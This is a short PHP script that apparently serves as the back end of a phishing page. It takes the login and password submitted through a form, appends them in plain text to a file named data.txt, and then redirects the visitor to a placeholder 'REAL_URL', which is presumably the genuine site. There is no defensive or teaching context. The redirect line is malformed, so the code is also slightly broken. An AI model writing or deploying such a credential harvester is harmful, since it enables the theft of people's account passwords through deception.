<?php 
/* Get fields: */
$login_field = "Login: " . $_POST["login"] . "\n";
$passwd_field = "Password :" . $_POST["password"] . "\n";

/* Open datalist file: */
$file = fopen("data.txt", "a");

/* Write/Save */
$lwrite = fwrite($file, $login_field);
$pwrite = fwrite($file, $passwd_field);

/* Close file: */
fclose($file);

// echo "Error message."

/* Redirect: */
header("Location REAL_URL")
?>
